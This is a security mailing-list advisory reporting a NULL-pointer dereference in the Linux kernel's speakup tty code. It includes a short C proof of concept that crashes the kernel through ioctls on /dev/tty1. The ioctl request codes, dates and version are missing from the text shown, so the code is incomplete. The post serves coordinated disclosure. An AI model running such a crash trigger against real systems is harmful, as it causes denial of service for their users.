  oss-security - Linux kernel NULL-ptr deref bug in spk_ttyio_receive_buf2            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [thread-next>] [day] [month] [year] [list]  Date: Mon, 7 Dec From: Shisong Qin To: oss-security@...ts.openwall.com Cc: nopitydays@...il.com Subject: Linux kernel NULL-ptr deref bug in spk_ttyio_receive_buf2  Hi,  Recently we found another NULL-ptr deref BUG in spk_ttyio.c in the latest Linux is the latest at that now). In the spk_ttyio_receive_buf2() function, it would dereference spk_ttyio_synth without checking whether it is NULL or not, and may lead to a NULL-ptr deref crash.  This bug could be reproduced in the Linux kernel (e.g. with CONFIG_ACCESSIBILITY=y, CONFIG_SPEAKUP=y and CONFIG_KASAN=y, and here is a simple poc:  #define _GNU_SOURCE  #include <dirent.h> #include <endian.h> #include <errno.h> #include <fcntl.h> #include <signal.h> #include <stdarg.h> #include <stdbool.h> #include <stdint.h> #include <stdio.h> #include <stdlib.h> #include <string.h> #include <sys/ioctl.h> #include <sys/stat.h> #include <sys/syscall.h> #include <sys/types.h> #include <sys/wait.h> #include <time.h> #include <unistd.h>  #pragma pack(1) typedef struct {         char subcode;         short xs, ys, xe, ye;         short sel_mode; } sel_struct;  int main(int argc, char const *argv[]) {      int disc = 0x1a;     int fd = open("/dev/tty1", 0, 0);     ioctl(fd, &disc);      sel_struct sel;     sel.subcode = 2;     sel.xs = sel.ys = sel.xe = sel.ye = 0;     sel.sel_mode = 0x0; // sel_mode = could trigger this NULL-ptr dereference bug     ioctl(fd, &sel);     char data = 3;     ioctl(fd, &data);     return 0; }  Here is the commit to patch this BUG:  Timeline: * - Vulnerability reported to security@...nel.org * - Vulnerability confirmed, and reported to linux-distros@...openwall.org. * - Vulnerability opened.  Thanks, Shisong Qin and Bodong Zhao, Tsinghua University   Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      